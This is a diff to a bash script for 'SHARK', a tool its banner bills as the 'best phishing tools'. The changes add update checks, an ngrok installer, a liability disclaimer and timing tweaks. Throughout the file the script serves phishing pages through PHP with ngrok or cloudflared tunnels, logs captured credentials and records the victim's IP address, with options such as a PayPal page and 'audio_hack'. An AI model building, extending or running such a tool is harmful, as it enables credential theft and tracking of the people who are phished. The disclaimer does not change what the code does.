@@ -1,5 +1,19 @@
 #!/bin/bash
 
+##############################################
+#                                            #
+#             PROJECT: SHARK                 #
+#              SHARK ©2022-2023              #
+#           BEST PHISHING TOOLS BY           #
+#             M r. D e r e K   (Contributor) #
+#          B h a v i k   O z a (Publisher)   #  
+#         A s h i s h  S i n g h (Author)    #
+##############################################
+
+#########
+# COLORS
+#########
+
 #colors
 white="\033[1;37m"                                          ##
 grey="\033[0;37m"                                           ##
@@ -16,8 +30,11 @@ blue="\033[1;34m"                                           ##
 l_red="\033[1;37;41m"                                       ##
 nc="\033[0m"                                                ##
 
+##########
+# VERSION
+##########
 
-VERSION="Modified"
+VERSION="2.5.1"
 
 ################
 # PRINT MESSAGE
@@ -68,6 +85,7 @@ spinner() {
 	do
                 i=$(( (i+1) %4 ))
                 printf "\r${cyan1}[${spin:$i:1}]${nc} ${cyan1} $launch"
+                sleep .1
 	done
         printf "\r   ${green}[✔]${nc} ${green} $splashdown";echo
         tput cnorm
@@ -83,6 +101,15 @@ function check_root() {
 	fi
 }
 
+
+######
+# USER
+######
+
+
+#####
+# OS
+#####
 
 function os () {
 	cat /etc/os-release > /dev/null 2>&1
@@ -108,17 +135,63 @@ function os () {
 	fi
 }
 
+function main_update() {
+	#launch="updating shark"
+	#splashdown="updated shark";echo
+	#os;(wget -q https://github.com/tech2gamer/shark/raw/Beta/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
+	echo
+	msg "update manually by installation command\n ~(check Official shark repo)"
+	sleep 2
+	echo
+	msg "Redirecting to Official shark repo..."
+	xdg-open 'https://github.com/Bhaviktutorials/shark'
+	exit 1
+}
 
+
+function update() {
+	version=$(curl -L -s https://raw.githubusercontent.com/tech2gamer/shark/Beta/shark | grep -w "VERSION=" | head -n1)
+	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
+	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
+		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run shark -u , shark --update" && echo && exit 1;	       
+        fi
+}
 
 ###########
 # INTERNET
 ###########
+
+#check ineternet connectivity for update
+function internet() {
+	ping -c 1 google.com > /dev/null 2>&1
+        if [ $? -eq 0 -a ! "${1}" = "--update" ] && [ $? -eq 0 -a ! "$1" = "-u" ];then
+                update
+	fi
+}
+
+
 function connection() {
         ping -c 1 google.com > /dev/null 2>&1
         if [[ "$?" != 0 ]];then
                 error_msg "No internet"
         exit 0
         fi
+}
+
+function check_update() {
+        connection
+        version=$(curl -L -s https://raw.githubusercontent.com/tech2gamer/shark/Beta/shark | grep -w "VERSION=" | head -n1)
+	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
+        if [ ${latest_version} = ${VERSION} ];then
+                echo -e "\tReading \tpackage \tlists... \tDone
+                         \tBuilding \tdependency \ttree
+                         \tReading \tstate \tinformation... \tDone
+                         \tshark \tis \talready \tthe \tnewest \tversion \t($VERSION)." | awk '{$1=$1};1'
+	        exit 1
+	else
+		main_update
+		exit 1
+	fi
 }
 
 ########
@@ -161,6 +234,33 @@ function assist() {
         #put manpage in man dir later
 	os
         man ${shark}/manpage
+}
+function fix_ngrok() {
+	#check for all arch
+	clear
+	cd $HOME 
+	os;rm -f ${BIN}/ngrok
+	launch="fixing ngrok"
+	splashdown="fixed ngrok";echo
+	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			ngrok_url="https://github.com/tech2gamer/stuff/raw/main/ngrok-2in1.zip"
+		elif [[ "$arch" == *'aarch64'* ]]; then
+		         if [[ "$ArNam" == *'amd64'* ]]; then
+                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
+                        else
+                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
+		         fi
+		elif [[ "$arch" == *'x86_64'* ]]; then
+		         if [[ "$ArNam" == *'amd64'* ]]; then
+                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
+                        else
+                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
+		         fi
+                else
+			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
+	fi
+	(wget --quiet ${ngrok_url} -O ngrok.zip) & spinner
+	unzip -q ngrok.zip && rm -rf ngrok.zip && chmod +x ngrok && mv ngrok $BIN
 }
 
 function fix_cloudflared() {
@@ -270,7 +370,10 @@ catch_ip() {
 
 # KILL NGROK
 function kill_session() {
-  killall -KILL php cloudflared &>/dev/null
+        #kill_ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
+        #kill -9 ${kill_php} > /dev/null 2>&1
+        #kill -9 ${kill_ngrok} > /dev/null 2>&1
+	killall -KILL ngrok php cloudflared &>/dev/null
 }
 
 function url_checker() {
@@ -333,6 +436,7 @@ function askuri() {
 		clear
 		echo
 		printf "${red}Please Try again...Server Down!!!"
+		sleep 2
                 clear
 		prt
 	fi
@@ -351,12 +455,13 @@ echo
 echo -e ${red}"Bro you didn't mentioned anything."
 echo
 echo -e ${green}"restarting your option No.$option...."
+sleep 2
 main
 fi
 if [[ $p == "s" ]]; then
 main2
 elif [[ $p == "S" ]]; then
-launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 7 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");askuri;
+launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");askuri;
 else
 final_url="Nothing to Modify localhost"
 link="http://${HOST}:$PORT"
@@ -368,11 +473,13 @@ PORT="8828"
 if [[ $p == "s" ]]; then
 echo
 msg "Your Default Port is $PORT !${white} \n"
+sleep 2
 main2
 elif [[ $p == "S" ]]; then
 echo
 msg "Your Default Port is $PORT !${white} \n"
-launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 7 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");askuri;
+sleep 2
+launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");askuri;
 else
 final_url="Nothing to modify localhost."
 
@@ -383,6 +490,7 @@ fi
 else
 	echo
 	error_msg "bro you type wrong..."
+	sleep 2
 	main
 fi
 }
@@ -404,6 +512,7 @@ function redirc() {
 		else
 			echo
 			error_msg "Somthing went wrong!!!"
+			sleep 2
 			exit 1
 		fi
 	else
@@ -430,6 +539,7 @@ elif [[ $ansm == "y" || $ansm == "Y" ]]; then
 else
 	echo
 	error_msg "Somthing went wrong!!! try again!"
+	sleep 2
 	redrkask
 fi
 }
@@ -459,7 +569,7 @@ if [[ -e ${logfile}.cloud.log ]]; then
 	touch ${logfile}.cloud.log
 fi
 if [[ `command -v termux-chroot` || "$osnam" == "Android" ]]; then
-	launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep .5; termux-chroot cloudflared tunnel --url "$HOST":"$PORT" --logfile ${logfile}.cloud.log > /dev/null 2>&1 & sleep 3 & spinner;
+	launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; termux-chroot cloudflared tunnel --url "$HOST":"$PORT" --logfile ${logfile}.cloud.log > /dev/null 2>&1 & sleep 5 & spinner;
 else
 	launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; cloudflared tunnel --url "$HOST":"$PORT" --logfile ${logfile}.cloud.log  > /dev/null 2>&1 & sleep 5 & spinner;
 fi
@@ -474,29 +584,38 @@ ${yellow}      ╚█████╗░███████║█████�
 ${green}      ░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗░
 ${blue}      ██████╔╝██║░░██║██║░░██║██║░░██║██║░╚██╗
 ${purple}      ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝ ${yellow}.beta v${VERSION}\n\n"
-p="s"
-if [ -e ${BIN}/cloudflared ]; then
-	if [[ $valu != "19" ]]; then
-		if [[ $reddc == "TRUE" ]]; then
-			redrkask
-			main
+#read -p $'\e[1;32m\e[94m Please enter your Option (A/B/D) : ' portfrd
+portfrd="b"
+if [[ $portfrd == "b" || $portfrd == "B" || $portfrd == "cloudflare" ]]; then
+	p="s"
+	if [ -e ${BIN}/cloudflared ]; then
+		echo
+		msg " cloudflare is already installed."
+		sleep 1
+		if [[ $valu != "19" ]]; then
+			if [[ $reddc == "TRUE" ]]; then
+				redrkask
+				main
+			else
+				redirc
+				main
+			fi
+
 		else
-			redirc
 			main
 		fi
 	else
-		main
-	fi
-else
-	echo
-	error_msg " cloudflare is not installed yet!\n"
-	msg "Preparing fix's ...\n"
-	echo
-	fix_cloudflared
-	decne
+		echo
+		error_msg " cloudflare is not installed yet!\n"
+		sleep 2
+		msg "Preparing fix's ...\n"
+		sleep 5
+		echo
+		fix_cloudflared
+		decne
+	fi 
 fi
 }
-
 
 function ipcatch() {
 ip=$( egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'  dumpip.txt | cut -d " " -f2 | tr -d '\r')
@@ -553,7 +672,7 @@ function ipinfo() {
 			msg "Victim's I.P  F O U N D "
 			echo ''
 			printf "${green}[*] Info Found\n\n"
-			sleep 0.25
+			sleep 0.75
 			ipcatch
 		fi
 	        if [[ -e "log.txt" ]]; then
@@ -676,13 +795,14 @@ function audio_hack() {
 
                 #cat index2.html >> index.php
 	        prt && credentials
-	        sleep 0.2
+	        sleep 0.5
 		ipinfo
 }
 decne() {
 	if [[ $valu == "19" ]]; then
 		echo 
 		msg "Don't worry will soon provide a stable feature for this.\n\n"
+		sleep 7
 		prt 
 		credentials
 		tail -f log.txt
@@ -701,6 +821,49 @@ decne() {
 			error_msg "somthing went wrong!! pls try again!!\n"
 		fi
 	fi
+}
+msgsh() {
+if [[ ! -e "${logfile}.sharkmsg" ]]; then
+	clear
+	msg "You Are Using Shark Beta .v$VERSION\n"
+	sleep 2
+	msg "Give us your feedback and idea's.\r• if you are facing any kind of error then let us know\n"
+	msg "Getting Things Ready... Please wait.\n\n"
+	sleep 5
+	clear
+	printf "                           ${red}|===========================|
+	                  [¤]   \e[1;33mD I S C L A I M E R${red}   [¤]
+	                   |===========================|\n\n"
+	error_msg "\e[1;32m• This tool you are going to use at your risk,\n\n• Developers and Publisher of Shark are not responsible for any kind hack and stuff.\n\n• shark is a open source tool that help us to know how phishing works\n\n• Phishing is illigal if you are using as offensive\n\n• The use of the SHARK & its resources/phishing-pages is COMPLETE RESPONSIBILITY of the END-USER.
+Developers assume NO liability and are NOT responsible for any damage caused by this program.
+Also we want to inform you that some of your actions may be ILLEGAL and you CAN NOT use this
+software to test device, company or any other type of target without WRITTEN PERMISSION from them.\n\n"
+msg "Give us your feedback on telegram chat grp:- https://t.me/bhaviktutorial\n"
+
+read -p $'\e[1;40m\e[1;92m T O  R U N  S H A R K  A C C E P T  D I S C L A I M E R\e[1;93m (Y/N) : \e[0m' shmsg
+
+if [[ $shmsg == "Y" || $shmsg == "y" || $shmsg == "yes" ]]; then
+		cd ${phish}
+		touch .sharkmsg
+		echo "You Accepted EULA" >> .sharkmsg
+		echo ""
+		msg "You Accepted EULA"
+		sleep 3
+		cd ~
+	elif [[ $shmsg == "N" || $shmsg == "n" || $shmsg == "no" ]]; then
+		clear
+		echo 
+		error_msg "You Haven't Accepted!!\n"
+		exit 1
+	else 
+		echo
+		clear
+		error_msg "Typing error, try again!!...\n"
+		exit 1
+	fi
+else
+	echo
+fi
 }
 FC_OPT() {
 echo ""
@@ -867,6 +1030,7 @@ function banner(){
 		else
 			clear
 			printf "${red}Bro you type wrong!!!"
+			sleep 2
 			error_msg "try again!!\n"
 		fi
 
@@ -945,6 +1109,7 @@ function banner(){
 		oldy="https://www.paypal.com"
 		echo
 		msg "Will try to give you best paypal phishing soon!"
+		sleep 5
 		decne
 	elif [ $option = 20 ];then
                 cd $phish/telegram/
@@ -1049,7 +1214,7 @@ function banner(){
 
 	else
 	    error_msg "Invalid option Try Again !!${white}\n"
-		sleep 0.3
+		sleep 0.8
 	fi
 done
 
@@ -1060,4 +1225,3 @@ done
 #                      THANKYOU                                     #
 #                                                                   #
 #####################################################################
-
